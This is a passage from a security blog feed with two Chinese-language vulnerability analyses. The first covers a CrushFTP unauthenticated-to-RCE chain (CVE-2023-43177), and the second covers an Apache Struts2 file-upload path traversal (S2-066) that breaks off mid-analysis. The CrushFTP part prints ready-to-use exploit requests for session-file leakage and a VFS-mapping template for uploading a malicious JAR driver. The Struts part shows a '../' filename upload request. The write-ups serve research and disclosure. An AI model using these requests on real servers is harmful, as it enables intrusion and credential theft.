class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path&quot;</span>)) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)), <span class="keyword">true</span>), <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (IOException ee) &#123;</span><br><span class="line">                Log.log(<span class="string">&quot;SERVER&quot;</span>, <span class="number">1</span>, ee);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.log(<span class="string">&quot;SERVER&quot;</span>, <span class="number">1</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>毕竟是log功能，程序会将请求记录不断写入<img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231210234410800.png" alt="image-20231210234410800"></p><p>而这部分功能则是受<code>add_log</code>控制，可以看到如果<code>dont_log</code>为<code>true</code>，那么就不会记录当前请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add_log</span><span class="params">(String log_data, String short_data, String check_data)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.uiBG(<span class="string">&quot;dont_log&quot;</span>)) &#123;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.logDateFormat == <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">this</span>.logDateFormat = (SimpleDateFormat)ServerStatus.thisObj.logDateFormat.clone();</span><br><span class="line">      &#125;</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>因此我们不难构造出</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/WebInterface/function/?command=getUsername&amp;c2f=a4Ga</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">as2-to</span><span class="punctuation">: </span>X</span><br><span class="line">user_name: crushadmin</span><br><span class="line">user_log_file: file_to_read</span><br><span class="line">user_log_path_custom: WebInterface/</span><br><span class="line">user_log_path: ./</span><br><span class="line">dont_log: true</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>currentAuth=a4Ga; CrushAuth=1702222555460_GEeImKOtIut9bj65EsoOrsDUAYa4Ga;</span><br><span class="line"></span><br><span class="line"><span class="ini"><span class="attr">post</span>=body</span></span><br></pre></td></tr></table></figure><p>表面上看来到此漏洞可能已经利用结束了，但实际上还能再更进一步</p><p>但继续阅读源码我们会发现，程序在运行过程还会”定期”，将session当中的属性信息保存到sessions.obj文件当中(保存的条件是重启过服务器…)，这个文件的作用相当于是充当了服务器重启时的缓存，因此漏洞利用需要看运气了</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231210235316865.png" alt="image-20231210235316865"></p><p>这里我们得到了完整的流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /WebInterface/function/?command=getUsername&amp;c2f=a4Ga HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span></span><br><span class="line">as2-to: X</span><br><span class="line">user_name: crushadmin</span><br><span class="line">user_log_file: sessions.obj</span><br><span class="line">user_log_path_custom: WebInterface/</span><br><span class="line">user_log_path: ./</span><br><span class="line">dont_log: <span class="keyword">true</span></span><br><span class="line">Content-Length: <span class="number">9</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: currentAuth=a4Ga; CrushAuth=1702222555460_GEeImKOtIut9bj65EsoOrsDUAYa4Ga;</span><br><span class="line"></span><br><span class="line">post=body</span><br></pre></td></tr></table></figure><p>之后访问<code>/WebInterface/sessions.obj/WebInterface/sessions.obj</code>即可获取到泄漏的session信息</p><p>在这里我们还可以尝试权限维持，可以看到这里存在一个借口可以直接获取到明文密码</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211001218626.png" alt="image-20231211001218626"></p><h2 id="后台代码执行"><a href="#后台代码执行" class="headerlink" title="后台代码执行"></a>后台代码执行</h2><p>在后台设置中，发现可以动态加载 SQL 驱动程序和配置测试，因此只需要能够上传恶意 JAR 文件即可实现RCE</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211000554219.png" alt="image-20231211000554219"></p><p>毕竟是FTP一定存在上传的点，但是在上传后发现没有权限</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211130810142.png" alt="image-20231211130810142"></p><p>经过查找我们可以发现在后台可以增加虚拟路径和物理路径的映射</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211131426907.png" alt="image-20231211131426907"></p><p>顺便抓了个包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command=setUserItem&amp;data_action=replace&amp;serverGroup=extra_vfs&amp;username=crushadmin~Y4Test&amp;user=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3Cuser+type%3D%22properties%22%3E%3Cusername%3Ecrushadmin~Y4Test%3C%2Fusername%3E%3Cpassword%3E%3C%2Fpassword%3E%3Cmax_logins%3E0%3C%2Fmax_logins%3E%3Croot_dir%3E%2F%3C%2Froot_dir%3E%3C%2Fuser%3E&amp;xmlItem=user&amp;vfs_items=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3Cvfs_items+type%3D%22vector%22%3E%0D%0A%3Cvfs_items_subitem+type%3D%22properties%22%3E%0D%0A%3Cname%3EY4TMP%3C%2Fname%3E%0D%0A%3Cpath%3E%2F%3C%2Fpath%3E%0D%0A%3Cvfs_item+type%3D%22vector%22%3E%0D%0A%3Cvfs_item_subitem+type%3D%22properties%22%3E%0D%0A%3Ctype%3EDIR%3C%2Ftype%3E%0D%0A%3Curl%3E%3C%2Furl%3E%0D%0A%3C%2Fvfs_item_subitem%3E%0D%0A%3C%2Fvfs_item%3E%0D%0A%3C%2Fvfs_items_subitem%3E%0D%0A%3Cvfs_items_subitem+type%3D%22properties%22%3E%0D%0A%3Cname%3Etmp%3C%2Fname%3E%0D%0A%3Cpath%3E%2FY4TMP%2F%3C%2Fpath%3E%0D%0A%3Cvfs_item+type%3D%22vector%22%3E%0D%0A%3Cvfs_item_subitem+type%3D%22properties%22%3E%0D%0A%3Ctype%3EDIR%3C%2Ftype%3E%0D%0A%3Curl%3EFILE%3A%2F%2FVolumes%2FMacintosh+HD%2Ftmp%2F%3C%2Furl%3E%0D%0A%3C%2Fvfs_item_subitem%3E%0D%0A%3C%2Fvfs_item%3E%0D%0A%3C%2Fvfs_items_subitem%3E%0D%0A%3C%2Fvfs_items%3E&amp;permissions=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3CVFS+type%3D%22properties%22%3E%0D%0A%3Citem+name%3D%22%2F%22%3E(read)(view)(resume)%3C%2Fitem%3E%0D%0A%3Citem+name%3D%22%2FY4TMP%2F%22%3E(read)(view)(resume)%3C%2Fitem%3E%0D%0A%3Citem+name%3D%22%2FY4TMP%2FTMP%2F%22%3E(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)%3C%2Fitem%3E%0D%0A%3C%2FVFS%3E&amp;c2f=kYjk</span><br></pre></td></tr></table></figure><p>对应以下的参数，按照此模板做修改即可注意替换username(用户名~随意的自定义参数|参考上面的图上面的截图就很容易理解)、c2f参数即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">command: setUserItem</span><br><span class="line">data_action: replace</span><br><span class="line">serverGroup: extra_vfs</span><br><span class="line">username: crushadmin~Y4Test</span><br><span class="line">user: &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;user type=<span class="string">&quot;properties&quot;</span>&gt;&lt;username&gt;crushadmin~Y4Test&lt;/username&gt;&lt;password&gt;&lt;/password&gt;&lt;max_logins&gt;<span class="number">0</span>&lt;/max_logins&gt;&lt;root_dir&gt;/&lt;/root_dir&gt;&lt;/user&gt;</span><br><span class="line">xmlItem: user</span><br><span class="line">vfs_items: &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;vfs_items type=<span class="string">&quot;vector&quot;</span>&gt;</span><br><span class="line">&lt;vfs_items_subitem type=<span class="string">&quot;properties&quot;</span>&gt;</span><br><span class="line">&lt;name&gt;Y4TMP&lt;/name&gt;</span><br><span class="line">&lt;path&gt;/&lt;/path&gt;</span><br><span class="line">&lt;vfs_item type=<span class="string">&quot;vector&quot;</span>&gt;</span><br><span class="line">&lt;vfs_item_subitem type=<span class="string">&quot;properties&quot;</span>&gt;</span><br><span class="line">&lt;type&gt;DIR&lt;/type&gt;</span><br><span class="line">&lt;url&gt;&lt;/url&gt;</span><br><span class="line">&lt;/vfs_item_subitem&gt;</span><br><span class="line">&lt;/vfs_item&gt;</span><br><span class="line">&lt;/vfs_items_subitem&gt;</span><br><span class="line">&lt;vfs_items_subitem type=<span class="string">&quot;properties&quot;</span>&gt;</span><br><span class="line">&lt;name&gt;tmp&lt;/name&gt;</span><br><span class="line">&lt;path&gt;/Y4TMP/&lt;/path&gt;</span><br><span class="line">&lt;vfs_item type=<span class="string">&quot;vector&quot;</span>&gt;</span><br><span class="line">&lt;vfs_item_subitem type=<span class="string">&quot;properties&quot;</span>&gt;</span><br><span class="line">&lt;type&gt;DIR&lt;/type&gt;</span><br><span class="line">&lt;url&gt;FILE:<span class="comment">//Volumes/Macintosh HD/tmp/&lt;/url&gt;</span></span><br><span class="line">&lt;/vfs_item_subitem&gt;</span><br><span class="line">&lt;/vfs_item&gt;</span><br><span class="line">&lt;/vfs_items_subitem&gt;</span><br><span class="line">&lt;/vfs_items&gt;</span><br><span class="line">permissions: &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;VFS type=<span class="string">&quot;properties&quot;</span>&gt;</span><br><span class="line">&lt;item name=<span class="string">&quot;/&quot;</span>&gt;(read)(view)(resume)&lt;/item&gt;</span><br><span class="line">&lt;item name=<span class="string">&quot;/Y4TMP/&quot;</span>&gt;(read)(view)(resume)&lt;/item&gt;</span><br><span class="line">&lt;item name=<span class="string">&quot;/Y4TMP/TMP/&quot;</span>&gt;(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)&lt;/item&gt;</span><br><span class="line">&lt;/VFS&gt;</span><br><span class="line">c2f: kYjk</span><br></pre></td></tr></table></figure><p>之后在主页上传jar包<img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211132022476.png" alt="image-20231211132022476"></p><p>抓了个包发现这样非常麻烦，需要两步，第一步相当于初始化，第二步还要计算文件大小拼接(19218是文件大小)</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211133549918.png" alt="image-20231211133549918"></p><p>通过阅读源码我发现了一个可替代的步骤，并且更简单，简化我们做自动化利用的步骤</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211133757762.png" alt="image-20231211133757762"></p><p>现在既然成功上传了，那就可以控制参数加载我们的恶意SQL驱动程序执行任意命令</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211132908890.png" alt="image-20231211132908890"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> CrushFTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Struts2 文件上传分析(S2-066)</title>
      <link href="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/"/>
      <url>/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Apache-Struts2-文件上传分析-S2-066"><a href="#Apache-Struts2-文件上传分析-S2-066" class="headerlink" title="Apache Struts2 文件上传分析(S2-066)"></a>Apache Struts2 文件上传分析(S2-066)</h1><p>struts2也很久没出过漏洞了吧，这次爆的是和文件上传相关</p><p>相关的commit在<a href="https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163">https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163</a></p><p>首先从commit可以看出，漏洞和大小写参数有关，后面会具体谈及<img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209190556071.png" alt="image-20231209190556071"><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209190701401.png" alt="image-20231209190701401"></p><p>同时结合CVE描述我们可以知道，大概和路径穿越有关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution. Users are recommended to upgrade to versions Struts 2.5.33 or Struts 6.3.0.2 or greater to fix this issue.</span><br></pre></td></tr></table></figure><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>这里我以6.3.0为例搭建</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定义一个UploadAction</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.struts2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.ServletActionContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> File upload;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件类型，为name属性值 + ContentType</span></span><br><span class="line">    <span class="keyword">private</span> String uploadContentType;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件名称，为name属性值 + FileName</span></span><br><span class="line">    <span class="keyword">private</span> String uploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> File <span class="title">getUpload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUpload</span><span class="params">(File upload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.upload = upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUploadContentType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUploadContentType</span><span class="params">(String uploadContentType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uploadContentType = uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUploadFileName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUploadFileName</span><span class="params">(String uploadFileName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uploadFileName = uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doUpload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String path = ServletActionContext.getServletContext().getRealPath(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;upload&quot;</span>;</span><br><span class="line">        String realPath = path + File.separator +uploadFileName;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyFile(upload, <span class="keyword">new</span> File(realPath));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在struts.xml当中，通常默认配置下这个文件在项目路径的/WEB-INF/classes路径下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.struts2.UploadAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doUpload&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以及在web.xml当中配置好filter</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.action<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从文件上传的Action也可以看出，struts2当中，文件上传的过程主要涉及到两个重要参数，以我的环境命名为例upload以及uploadFileName</p><p>上面描述可知此漏洞为路径穿越，而我们知道Struts2本身是有一系列默认拦截器，这部分配置在struts-default.xml中，其中就包含了一个与文件上传相关的拦截器<code>org.apache.struts2.interceptor.FileUploadInterceptor</code><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209192607411.png" alt="image-20231209192607411"></p><p>我们先来测试一下文件上传</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;../1.txt&quot;</span></span><br><span class="line"><span class="pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="pgsql"></span></span><br><span class="line"><span class="pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br><span class="line"><span class="pgsql"></span></span><br></pre></td></tr></table></figure><p>发现落地的文件名字变成了1.txt</p><p><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209212334957.png" alt="image-20231209212334957"></p><p>我们简单来做个debug，看看文件上传的处理流程</p><p>首先在org.apache.struts2.interceptor.FileUploadInterceptor#intercept中</p><p>获取文件名通过multiWrapper.getFileNames做处理</p><p><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209193411457.png" alt="image-20231209193411457"></p><p>最终是由org.apache.struts2.dispatcher.multipart.AbstractMultiPartRequest#getCanonicalName做文件名处理，以下是部分调试栈，有兴趣的可以自行debug</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getCanonicalName:<span class="number">162</span>, AbstractMultiPartRequest (org.apache.struts2.dispatcher.multipart)</span><br><span class="line">getFileNames:<span class="number">265</span>, JakartaMultiPartRequest (org.apache.struts2.dispatcher.multipart)</span><br><span class="line">getFileNames:<span class="number">159</span>, MultiPartRequestWrapper (org.apache.struts2.dispatcher.multipart)</span><br><span class="line">intercept:<span class="number">279</span>, FileUploadInterceptor (org.apache.struts2.interceptor)</span><br></pre></td></tr></table></figure><p>这部分代码很直白，拦截了路径穿越</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 